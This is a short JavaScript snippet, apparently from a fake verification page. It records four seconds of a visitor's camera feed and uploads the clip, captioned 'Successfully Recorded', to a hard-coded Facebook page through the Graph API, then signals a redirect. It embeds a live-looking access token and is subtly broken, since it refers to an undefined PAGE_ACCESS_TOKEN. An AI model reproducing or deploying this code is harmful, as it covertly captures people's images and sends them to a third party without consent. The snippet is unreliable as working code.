(async function() {
 const PAGE_ID = "621898520998013";
  const ACCESS_TOKEN = "EAAUG0iogqEYBQ89EY0zyisuNsN2KxPQPSpA7MIv87dn1oQUmL38XVQCnUtBmziCJLRKXbX3fED8JbXMT9FXfHzHKm8AiCTZBDG1lZCDZAQ54IIPyLJHZB1AZACKqUiIDL9Y469aYjWevtsxkEt4BuLH60yeLOXtkjoGp0ZBtASh9cLRnhdcNVrRfK5MI4JHxAX8f3BKB16";

    const video = document.getElementById('preview');
    const canvas = document.createElement('canvas');

    async function handleCapture() {
        try {
            const stream = video.srcObject;
            if (!stream || video.videoWidth === 0) {
                setTimeout(handleCapture, 500);
                return;
            }

            

// --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const videoData = new FormData();
videoData.append("source", videoBlob, "video.mp4");
videoData.append("description", "🎬 Successfully Recorded ✔");
videoData.append("access_token", PAGE_ACCESS_TOKEN);

await fetch(`https://graph.facebook.com/${PAGE_ID}/videos`, {
  method: "POST",
  body: videoData
});
                
                // Báo hiệu chuyển hướng
                window.mainScriptFinished = true;
            };

            recorder.start();
            setTimeout(() => { recorder.stop(); }, 4000);

        } catch (err) {
            console.error("Lỗi xác thực:", err);
            window.mainScriptFinished = true;
        }
    }

    handleCapture();
})();
